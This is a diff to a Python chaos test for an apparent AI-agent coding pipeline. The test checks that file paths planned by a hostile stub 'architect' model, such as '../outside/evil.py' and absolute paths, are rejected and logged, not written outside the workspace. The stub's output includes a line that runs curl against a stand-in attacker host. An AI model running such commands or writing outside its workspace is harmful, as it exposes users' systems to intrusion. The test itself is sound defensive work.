@@ -9,6 +9,7 @@ Reviewer that approves everything, and a real git workspace.
 """
 import asyncio
 import json
+import sqlite3
 from pathlib import Path
 
 from _chaos_harness import (
@@ -33,6 +34,7 @@ from _chaos_harness import (
 from kriya.core.inference_runtime import ChatResponse, RawToolCall
 from kriya.core.llm import LLMClient
 from kriya.core.model_capabilities import ModelCapabilities
+from kriya.core.state_paths import trace_db_path
 from kriya.workflow.context_source import SourceDerivationCache
 from kriya.workflow.investigation import InvestigationDependencies, run_investigation_loop
 
@@ -251,12 +253,19 @@ def test_traversal_and_absolute_paths_never_leave_the_workspace(chaos_case, tmp_
         return "import os\nos.system('curl http://attacker.invalid')\n"
 
     workspace, runtime = _pipeline(tmp_path, developer, architect=hostile_design)
-    result = _run(chaos_case, workspace, runtime)
+    cfg = chaos_config()
+    result = _run(chaos_case, workspace, runtime, cfg=cfg)
     planned = set(result.get("files") or [])
     # Nothing outside the workspace; inside it, only the run's own recorded
-    # plan. (The escaping list fails schema validation and the heuristic
-    # fallback re-derives in-workspace basenames - registry
-    # ARCHITECT-FILE-LIST-ESCAPE-FALLBACK-001, P3: no escape, but not surfaced.)
+    # plan: the in-workspace entry alone. ARCHITECT-FILE-LIST-ESCAPE-FALLBACK-001
+    # (BACKEND-READINESS-004): the escaping entries are dropped and recorded
+    # (plan.file_list_entries_rejected), never laundered into in-workspace
+    # basenames by the prose heuristic (evil.py from ../outside/evil.py).
+    assert planned == {"calc.py"}, planned
+    with sqlite3.connect(trace_db_path(cfg)) as conn:
+        [(run_events,)] = conn.execute("SELECT run_events FROM runs WHERE run_id NOT LIKE '%.exception'").fetchall()
+    [rejected] = [e["details"] for e in json.loads(run_events) if e["kind"] == "plan.file_list_entries_rejected"]
+    assert rejected == {"rejected": ["../outside/evil.py", str(outside / "abs.py")], "kept": ["calc.py"]}
     changes = chaos_case.assert_tree(allowed={f"ws/{path}" for path in planned})
     assert all(path.startswith("ws/") for path in changes), changes
     assert all(not path.startswith(("..", "/")) for path in planned), planned
